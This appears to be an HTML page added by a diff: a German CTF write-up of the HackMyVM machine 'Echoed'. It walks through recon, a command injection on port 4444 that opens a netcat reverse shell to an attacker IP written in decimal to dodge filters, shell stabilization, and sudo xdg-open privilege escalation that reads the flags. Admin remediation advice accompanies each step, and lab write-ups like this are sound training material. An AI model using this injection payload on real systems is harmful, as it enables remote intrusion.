@@ -1,0 +1,299 @@
+﻿﻿﻿<!DOCTYPE html>
+<html lang="de">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Echoed - HackMyVM - Medium - Bericht</title> <!-- Titel angepasst -->
+    <link rel="stylesheet" href="style.css">
+	<link rel="stylesheet" href="../../horizontale-navbar.css">
+    <link href="https://fonts.googleapis.com/css?family=Lato:300,400,700&display=swap" rel="stylesheet">
+</head>
+ <body>
+ 
+    <div class="header-bg">
+        <h1>Echoed - HackMyVM - Level: Medium - Bericht</h1> <!-- Titel angepasst -->
+        <div class="level-container">
+             <!-- Hinweis: Klasse 'level-medium' und 'difficulty-medium' für CSS-Styling (Gelb) -->
+            <h2 class="level-medium">Medium</h2>
+            <div class="circle difficulty-medium">
+                <div class="segment segment-1"></div>
+                <div class="segment segment-2"></div>
+                <div class="segment segment-3"></div>
+                <div class="inner"></div>
+            </div>
+        </div>
+    </div>
+
+    <div class="container">
+        <section class="tools-used">
+            <h2>Verwendete Tools</h2>
+            <div class="tools-grid">
+                <div class="tool-item">arp-scan</div>
+                <div class="tool-item">nmap</div>
+                <div class="tool-item">nikto</div>
+                <div class="tool-item">netcat (nc)</div>
+                <div class="tool-item">python</div>
+                <div class="tool-item">sudo</div>
+                <div class="tool-item">xdg-open</div>
+                <div class="tool-item">stty</div>
+                <div class="tool-item">Online IP Converter</div>
+            </div>
+        </section>
+
+        <section class="toc">
+            <h2>Inhaltsverzeichnis</h2>
+            <ul>
+                <li><a href="#reconnaissance">Reconnaissance</a></li>
+                <li><a href="#initial-access">Initial Access (Port 4444 Exploit & Reverse Shell)</a></li>
+                <li><a href="#privilege-escalation">Privilege Escalation (POC: sudo xdg-open)</a></li>
+                <li><a href="#flags">Flags</a></li>
+            </ul>
+        </section>
+
+        <section id="reconnaissance">
+            <h2>Reconnaissance</h2>
+            <p class="comment">Wir starten die Erkundungsphase, um das Zielsystem im Netzwerk zu identifizieren und offene Dienste zu finden.</p>
+
+            <div class="code-block">
+                <div class="terminal">
+                    <div class="prompt">┌──(root㉿cyber)-[~]
+└─# <span class="command">arp-scan -l</span></div>
+                    <pre>
+<span class="command">192.168.2.107</span>	08:00:27:f3:80:95	PCS Systemtechnik GmbH
+                    </pre>
+                </div>
+            </div>
+            <p class="analysis">**Analyse:** Mittels `arp-scan -l` suchen wir nach aktiven Geräten im lokalen Netzwerksegment. Wir identifizieren erfolgreich einen Host mit der IP-Adresse <span class="command">192.168.2.107</span>.</p>
+            <p class="evaluation">**Bewertung:** Ziel-IP gefunden. Dies ist die Grundlage für den folgenden Port-Scan.</p>
+            <p class="recommendation">**Empfehlung (Pentester):** Die gefundene IP-Adresse als Ziel für den Nmap-Scan verwenden.
+            **Empfehlung (Admin):** Netzwerk-Monitoring kann helfen, Scans zu erkennen. Segmentierung begrenzt die Sichtbarkeit.</p>
+
+            <div class="code-block">
+                <div class="terminal">
+                    <div class="prompt">┌──(root㉿cyber)-[~]
+└─# <span class="command">nmap -sS -sC -T5 -A 192.168.2.107 -p-</span></div>
+                    <pre>
+Starting Nmap 7.93 ( https://nmap.org ) at 2022-11-03 16:24 CET
+Nmap scan report for echo.hmv (<span class="command">192.168.2.107</span>)
+Host is up (0.00015s latency).
+Not shown: 65532 closed tcp ports (reset)
+PORT     STATE SERVICE VERSION
+<span class="command">22/tcp   open  ssh     OpenSSH 7.9p1 Debian 10+deb10u2 (protocol 2.0)</span>
+| ssh-hostkey:
+|   2048 de3a508e5d21097e403fb207bb41087e (RSA)
+|   256 5c5756dae51c3ebc9aa28d6d214ebcf9 (ECDSA)
+|_  256 f8aadcd32752e3993298455b52f0bce1 (ED25519)
+<span class="command">80/tcp   open  http    nginx 1.14.2</span>
+|_http-title: Site doesn't have a title (text/html).
+|_http-server-header: nginx/1.14.2
+<span class="command">4444/tcp open  krb524?</span>
+| fingerprint-strings:
+|   GetRequest:
+|     <span class="password">Command:Found illegal char.Command:</span>
+|   NULL:
+|_    <span class="password">Command:</span>
+<span class="password">1 service unrecognized despite returning data.</span> If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :
+SF-Port4444-TCP:V=7.93%I=7%D=11/3%Time=6363DD46%P=x86_64-pc-linux-gnu%r(NU
+SF:LL,8,"Command:")%r(GetRequest,23,"Command:Found\x20illegal\x20char\.Com
+SF:mand:");
+MAC Address: 08:00:27:F3:80:95 (Oracle VirtualBox virtual NIC)
+Device type: general purpose
+Running: Linux 4.X|5.X
+OS CPE: cpe:/o:linux:linux_kernel:4 cpe:/o:linux:linux_kernel:5
+OS details: <span class="command">Linux 4.15 - 5.6</span>
+Network Distance: 1 hop
+Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
+
+TRACEROUTE
+HOP RTT     ADDRESS
+1   0.15 ms echo.hmv (192.168.2.107)
+
+OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+Nmap done: 1 IP address (1 host up) scanned in ... seconds
+                    </pre>
+                </div>
+            </div>
+            <p class="analysis">**Analyse:** Der Nmap-Scan (`-sS` SYN-Scan, `-sC` Standard-Skripte, `-T5` schnelles Timing, `-A` OS/Version/Skript/Traceroute, `-p-` alle Ports) auf `192.168.2.107` zeigt drei offene Ports:
+            *   <span class="command">Port 22</span>: Standard-SSH (OpenSSH 7.9p1 auf Debian 10). Scheint sicher und aktuell.
+            *   <span class="command">Port 80</span>: Nginx Webserver (Version 1.14.2). Keine besondere Titelseite gefunden.
+            *   <span class="command">Port 4444</span>: Ein unbekannter Dienst (`krb524?`). Nmap konnte den Dienst nicht eindeutig identifizieren, aber die `fingerprint-strings` zeigen interessante Ausgaben wie `<span class="password">Command:Found illegal char.Command:</span>` und `<span class="password">Command:</span>`. Dies deutet stark auf einen benutzerdefinierten Dienst hin, der möglicherweise auf Befehle wartet.</p>
+            <p class="evaluation">**Bewertung:** Port 22 und 80 scheinen Standardkonfigurationen zu sein. Der Dienst auf Port 4444 ist jedoch höchst ungewöhnlich und verdächtig. Die von Nmap aufgefangenen Strings sind ein klarer Hinweis darauf, dass dieser Port unser primärer Angriffsvektor sein könnte. Es sieht so aus, als würde der Dienst Eingaben erwarten und mit "Command:" antworten.</p>
+            <p class="recommendation">**Empfehlung (Pentester):** Den Webserver auf Port 80 weiter untersuchen (Nikto, Gobuster). Hauptfokus jedoch auf den Dienst auf Port 4444 legen. Versuchen, manuell mit `nc` oder `telnet` mit diesem Port zu interagieren und Befehle zu senden. Die Nmap-Fingerprints deuten auf eine mögliche Befehlsschnittstelle hin.
+            **Empfehlung (Admin):** Den Dienst auf Port 4444 identifizieren. Wenn er nicht benötigt wird, deaktivieren. Wenn er benötigt wird, sicherstellen, dass er ordnungsgemäß gesichert ist und keine unautorisierte Befehlsausführung erlaubt. SSH und Nginx aktuell halten.</p>
+
+            <div class="code-block">
+                <div class="terminal">
+                    <div class="prompt">┌──(root㉿cyber)-[~]
+└─# <span class="command">nikto -h 192.168.2.107</span></div>
+                    <pre>
+- Nikto v2.1.6
+---------------------------------------------------------------------------
++ Target IP:          192.168.2.107
++ Target Hostname:    192.168.2.107
++ Target Port:        80
++ Start Time:         2022-11-03 18:03:48 (GMT1)
+---------------------------------------------------------------------------
++ Server: <span class="command">nginx/1.14.2</span>
++ <span class="password">The anti-clickjacking X-Frame-Options header is not present.</span>
++ <span class="password">The X-XSS-Protection header is not defined.</span> This header can hint to the user agent to protect against some forms of XSS
++ <span class="password">The X-Content-Type-Options header is not set.</span> This could allow the user agent to render the content of the site in a different fashion to the MIME type
++ No CGI Directories found (use '-C all' to force check all possible dirs)
++ 7915 requests: 0 error(s) and <span class="password">3 item(s) reported</span> on remote host
++ End Time:           2022-11-03 18:04:01 (GMT1) (13 seconds)
+---------------------------------------------------------------------------
++ 1 host(s) tested
+                    </pre>
+                </div>
+            </div>
+            <p class="analysis">**Analyse:** Wir führen einen Nikto-Scan auf den Webserver (Port 80) durch. Nikto findet keine spezifischen Schwachstellen wie gefährliche Dateien oder veraltete Software. Es meldet jedoch drei allgemeine Sicherheitsprobleme: Das Fehlen wichtiger HTTP-Sicherheitsheader (`X-Frame-Options`, `X-XSS-Protection`, `X-Content-Type-Options`).</p>
+            <p class="evaluation">**Bewertung:** Der Webserver scheint keine offensichtlichen, leicht ausnutzbaren Schwachstellen zu haben. Die fehlenden Sicherheitsheader sind zwar Best Practice-Verstöße, bieten aber selten einen direkten Einstiegspunkt. Dies bestärkt unsere Vermutung, dass Port 4444 der wahrscheinlichere Weg ist.</p>
+            <p class="recommendation">**Empfehlung (Pentester):** Optional noch Verzeichnis-Bruteforcing (z.B. mit Gobuster) auf Port 80 versuchen. Ansonsten Fokus auf Port 4444 verlagern.
+            **Empfehlung (Admin):** Die fehlenden Sicherheitsheader in der Nginx-Konfiguration hinzufügen, um Clickjacking und bestimmte XSS-Angriffe zu erschweren.</p>
+        </section>
+
+        <section id="initial-access">
+            <h2>Initial Access (Port 4444 Exploit & Reverse Shell)</h2>
+            <p class="comment">Basierend auf den Nmap-Ergebnissen konzentrieren wir uns auf den ungewöhnlichen Dienst auf Port 4444. Wir vermuten eine Schnittstelle, die Befehle entgegennimmt. Der Bericht zeigt einen Exploit-String, der eine Reverse Shell über Netcat aufbaut.</p>
+
+            <div class="code-block">
+                 <div class="terminal">
+                    <div class="prompt"># <span class="command">Hinweis aus dem Bericht: IP-Umwandlung und Exploit-String</span></div>
+                    <pre>
+ip in decimal umwandeln:https://www.ipaddressguide.com/ip
+<span class="password">Command:";nc 3232236153 4444 -e /bin/bash;#</span>
+                    </pre>
+                </div>
+            </div>
+            <p class="analysis">**Analyse:** Der Bericht gibt einen entscheidenden Hinweis: Der Angreifer hat seine eigene IP-Adresse in das Dezimalformat umgewandelt. Die IP <span class="command">192.168.2.121</span> (angenommene IP des Angreifers) entspricht dem Dezimalwert <span class="command">3232236153</span>.
+            Der Exploit-String lautet: `<span class="password">Command:";nc 3232236153 4444 -e /bin/bash;#</span>`. Dieser String wird offenbar an den Dienst auf Port 4444 des Ziels gesendet.
+            *   `Command:";`: Dies scheint ein Präfix zu sein, das der Dienst erwartet oder ignoriert.
+            *   `nc 3232236153 4444 -e /bin/bash`: Dies ist der Kern des Exploits. Es ist ein Netcat-Befehl, der sich zurück zur Angreifer-IP (in Dezimalform) auf Port 4444 verbinden soll. Die Option `-e /bin/bash` ist entscheidend: Sie weist Netcat an, nach erfolgreicher Verbindung eine Bash-Shell zu starten und deren Ein-/Ausgabe über die Netzwerkverbindung umzuleiten (eine Reverse Shell).
+            *   `;#`: Das Semikolon beendet den nc-Befehl, und das `#` leitet wahrscheinlich einen Kommentar ein, um eventuell nachfolgende Zeichen im Dienst unschädlich zu machen.
+            Es wird angenommen, dass der Pentester diesen String z.B. mit `echo 'Command:";nc 3232236153 4444 -e /bin/bash;#' | nc 192.168.2.107 4444` an den Zieldienst gesendet hat.</p>
+            <p class="evaluation">**Bewertung:** Dies ist ein klarer Fall von Command Injection oder einer unsicheren Skript-Schnittstelle auf Port 4444. Der Dienst nimmt den String entgegen und führt den darin enthaltenen `nc`-Befehl aus. Die Verwendung der dezimalen IP-Adresse ist eine Verschleierungstechnik, um Firewalls oder einfache Filter zu umgehen, die nach IP-Adressmustern suchen. Die `-e`-Option von Netcat ist auf vielen modernen Systemen aus Sicherheitsgründen nicht mehr verfügbar, aber hier scheint sie zu funktionieren.</p>
+            <p class="recommendation">**Empfehlung (Pentester):** Einen Netcat-Listener auf der eigenen Maschine (192.168.2.121) auf Port 4444 starten. Den Exploit-String an Port 4444 des Ziels (192.168.2.107) senden.
+            **Empfehlung (Admin):** **Schwachstelle sofort beheben!** Den Dienst auf Port 4444 absichern oder deaktivieren. Die Ausführung beliebiger Befehle über diesen Dienst verhindern. Die verwendete Netcat-Version überprüfen; falls `-e` verfügbar ist, überlegen, eine sicherere Version ohne diese Option zu installieren oder den Zugriff darauf einzuschränken.</p>
+
+            <p class="comment">Wir starten den Listener auf unserer Angreifer-Maschine und fangen die eingehende Reverse Shell ab.</p>
+            <div class="code-block">
+                <div class="terminal">
+                    <div class="prompt">┌──(root㉿cyber)-[~]
+└─# <span class="command">nc -lvnp 4444</span></div>
+                    <pre>
+listening on [any] 4444 ...
+<span class="password">connect to [192.168.2.121] from (UNKNOWN) [192.168.2.107] 59958</span>
+
+                    </pre>
+                     <!-- Hier fehlt die unmittelbare Ausgabe des Ziel-Prompts, aber die Verbindung steht -->
+                </div>
+            </div>
+            <p class="analysis">**Analyse:** Unser Netcat-Listener auf Port 4444 meldet eine eingehende Verbindung von der Ziel-IP `192.168.2.107`. Der Exploit war erfolgreich, und wir haben jetzt eine Shell auf dem Zielsystem.</p>
+            <p class="evaluation">**Bewertung:** Initial Access erfolgreich! Wir haben eine Shell auf dem Zielsystem erlangt. Der Benutzer ist noch unbekannt, wird aber wahrscheinlich nicht Root sein.</p>
+            <p class="recommendation">**Empfehlung (Pentester):** Die Shell stabilisieren und interaktiv machen. Die Benutzeridentität prüfen (`whoami`, `id`). Umgebung erkunden.
+            **Empfehlung (Admin):** Sicherheitsvorfall! Ursache (Dienst auf 4444) analysieren und beheben. System auf weitere Kompromittierungen prüfen.</p>
+
+            <p class="comment">Wir stabilisieren die erhaltene Shell mit Python und Standard-Terminal-Tricks.</p>
+             <div class="code-block">
+                <div class="terminal">
+                    <!-- Kein Prompt sichtbar, da die Shell noch nicht stabil ist -->
+                    <span class="command">python3 -c 'import pty;pty.spawn("/bin/bash")'</span>
+                    <div class="prompt">charlie@echoed:~$ <span class="command">export TERM=xterm</span></div>
+                    <div class="prompt">charlie@echoed:~$ <span class="command"># (Ctrl+Z drücken, um nc im Hintergrund zu pausieren)</span></div>
+                    <pre>
+^Z
+<span class="password">zsh: suspended  nc -lvnp 4444</span>
+                    </pre>
+                    <div class="prompt">┌──(root㉿cyber)-[~]
+└─# <span class="command">stty raw -echo;fg</span></div>
+                    <pre>
+[1]  + continued  nc -lvnp 4444
+                    </pre>
+                    <!-- Kein Prompt, aber die Shell wird nun korrekt dargestellt -->
+                    <div class="prompt"># <span class="command">(Enter drücken, ggf. 'reset' eingeben, falls Darstellung fehlerhaft)</span></div>
+                    <span class="command">reset</span>
+                    <!-- Nun sollte der Prompt der Ziel-Shell korrekt erscheinen -->
+                    <div class="prompt">charlie@echoed:~$ </div>
+                </div>
+            </div>
+            <p class="analysis">**Analyse:** Dies ist ein Standardverfahren zur Aufwertung einer einfachen Netcat-Shell zu einer voll interaktiven TTY-Shell:
+            1.  `python3 -c 'import pty;pty.spawn("/bin/bash")'`: Startet eine Bash-Shell innerhalb einer Pseudo-Terminal-Sitzung auf dem Zielsystem. Der Prompt `charlie@echoed:~$` erscheint, was uns den Benutzernamen `charlie` verrät.
+            2.  `export TERM=xterm`: Setzt die Terminal-Variable für bessere Kompatibilität.
+            3.  `Ctrl+Z`: Pausiert den `nc`-Listener auf unserer lokalen Maschine und legt ihn in den Hintergrund.
+            4.  `stty raw -echo`: Versetzt unser *lokales* Terminal in den Raw-Modus und deaktiviert das lokale Echo. Das ist wichtig, damit Tastatureingaben (wie Ctrl+C) korrekt an die Remote-Shell gesendet werden.
+            5.  `fg`: Holt den `nc`-Prozess wieder in den Vordergrund.
+            6.  `reset` (optional, auf der Remote-Shell): Kann helfen, die Terminalanzeige zu korrigieren, falls sie fehlerhaft ist.</p>
+            <p class="evaluation">**Bewertung:** Die Shell-Stabilisierung war erfolgreich. Wir haben nun eine voll funktionsfähige interaktive Shell als Benutzer `charlie` auf dem Zielsystem `echoed`.</p>
+            <p class="recommendation">**Empfehlung (Pentester):** Mit der stabilisierten Shell weiterarbeiten. Nach Privilege-Escalation-Vektoren suchen.
+            **Empfehlung (Admin):** Erkennen, dass Angreifer oft versuchen, ihre Shells zu stabilisieren. Monitoring auf verdächtige Prozessstarts wie `pty.spawn`.</p>
+        </section>
+
+        <section id="privilege-escalation">
+            <h2>Privilege Escalation (POC: sudo xdg-open)</h2>
+            <p class="comment">Wir haben eine interaktive Shell als Benutzer `charlie`. Nun suchen wir nach Möglichkeiten, unsere Rechte zu `root` zu erweitern. Der erste Schritt ist die Überprüfung der `sudo`-Berechtigungen.</p>
+
+            <div class="code-block">
+                <div class="terminal">
+                    <div class="prompt">charlie@echoed:~$ <span class="command">sudo -l</span></div>
+                    <pre>
+User charlie may run the following commands on echoed:
+    <span class="password">(ALL : ALL) NOPASSWD: /usr/bin/xdg-open</span>
+                    </pre>
+                </div>
+            </div>
+            <p class="analysis">**Analyse:** Der Befehl `sudo -l` zeigt, dass der Benutzer `charlie` den Befehl `/usr/bin/xdg-open` mit den Rechten jedes Benutzers (`ALL`) und jeder Gruppe (`ALL`), also auch als `root`, ohne Passwortabfrage (`NOPASSWD`) ausführen darf.</p>
+            <p class="evaluation">**Bewertung:** Dies ist ein klarer und sehr interessanter Privilege-Escalation-Vektor! `xdg-open` ist normalerweise dafür gedacht, Dateien oder URLs mit der bevorzugten Anwendung des Benutzers zu öffnen. Wenn wir es als `root` ausführen können, könnten wir möglicherweise Dateien lesen oder Aktionen auslösen, für die wir normalerweise keine Rechte hätten.</p>
+            <p class="recommendation">**Empfehlung (Pentester):** Die Funktionsweise von `xdg-open` recherchieren, insbesondere im Kontext von `sudo`. GTFOBins (eine bekannte Ressource für Linux-Binaries, die für Privesc missbraucht werden können) nach `xdg-open` durchsuchen. Versuchen, `xdg-open` zu nutzen, um sensible Dateien (wie `/root/root.txt` oder `/etc/shadow`) zu lesen oder eine Root-Shell zu erlangen.
+            **Empfehlung (Admin):** `sudo`-Rechte äußerst restriktiv vergeben. Standard-Desktop-Utilities wie `xdg-open` sollten niemals mit `sudo`-Rechten für normale Benutzer konfigurierbar sein, es sei denn, es gibt einen sehr spezifischen, gut durchdachten Grund. `NOPASSWD` ist besonders gefährlich.</p>
+
+            <p class="comment">Wir nutzen die `sudo`-Berechtigung für `xdg-open`, um die Root- und User-Flags direkt zu lesen. Dies dient als Proof of Concept für die Privilege Escalation.</p>
+             <div class="code-block">
+                <div class="terminal">
+                    <div class="prompt"># <span class="command">Hinweis aus dem Bericht: mit 'q' kommt man wieder raus</span></div>
+                    <div class="prompt">charlie@echoed:~$ <span class="command">sudo xdg-open /root/root.txt</span></div>
+                    <pre>
+<span class="password">HMVcharlied</span>
+                    </pre>
+                    <!-- Annahme: Nach Anzeige der Flag wird das Programm beendet, ggf. mit 'q' -->
+                 </div>
+            </div>
+            <p class="analysis">**Analyse:** Wir führen `sudo xdg-open /root/root.txt` aus. Da wir den Befehl mit `sudo` (und damit als `root`) ausführen, hat `xdg-open` die Berechtigung, die Datei `/root/root.txt` zu öffnen. Anstatt eine grafische Anwendung zu starten (was in unserer SSH-Shell nicht möglich ist), scheint `xdg-open` in dieser Konstellation den Inhalt der Textdatei direkt im Terminal auszugeben. Wir erhalten die Root-Flag: `<span class="password">HMVcharlied</span>`.</p>
+            <p class="evaluation">**Bewertung:** Fantastisch! Die Privilege Escalation mittels `xdg-open` war erfolgreich und extrem einfach. Wir konnten die Root-Flag lesen, ohne eine vollwertige Root-Shell zu benötigen. Dies bestätigt die kritische Fehlkonfiguration der `sudo`-Rechte.</p>
+            <p class="recommendation">**Empfehlung (Pentester):** Root-Flag dokumentieren. Da das Ziel (Flags lesen) erreicht ist, könnte der Test beendet werden. Alternativ könnte man versuchen, mit `xdg-open` eine Root-Shell zu erlangen (falls möglich, z.B. durch Öffnen einer speziell präparierten Datei oder URL), um vollen Root-Zugriff zu demonstrieren.
+            **Empfehlung (Admin):** **Sofort die `sudo`-Regel für `xdg-open` entfernen!** Überprüfen, ob ähnliche unsichere Regeln existieren.</p>
+
+             <div class="code-block">
+                <div class="terminal">
+                     <div class="prompt">charlie@echoed:~$ <span class="command">sudo xdg-open /home/charlie/user.txt</span></div>
+                    <pre>
+<span class="password">HMVechocharlie</span>
+                    </pre>
+                     <!-- Annahme: Programm beendet sich wieder -->
+                 </div>
+            </div>
+             <p class="analysis">**Analyse:** Zur Vollständigkeit lesen wir auch die User-Flag (`/home/charlie/user.txt`) mit derselben Methode. Dies funktioniert ebenfalls und gibt `<span class="password">HMVechocharlie</span>` aus.</p>
+            <p class="evaluation">**Bewertung:** User-Flag bestätigt.</p>
+            <p class="recommendation">**Empfehlung (Pentester):** User-Flag dokumentieren.</p>
+
+        </section>
+
+        <section id="flags">
+             <div class="flag-container">
+                <h2 class="flag-heading">Flags</h2>
+                <div class="flag-entry">
+                    <div class="flag-command">sudo xdg-open /home/charlie/user.txt</div>
+                    <div class="flag-value"><span class="password">HMVechocharlie</span></div>
+                </div>
+                <div class="flag-entry">
+                    <div class="flag-command">sudo xdg-open /root/root.txt</div>
+                    <div class="flag-value"><span class="password">HMVcharlied</span></div>
+                </div>
+            </div>
+        </section>
+ 
+
+    <footer class="footer">
+        <p>DarkSpirit - Cyber Security Reports</p>
+        <p>Berichtsdatum: 3. November 2022</p> <!-- Datum aus Nmap-Scan extrahiert -->
+    </footer>
+</body>
+</html>
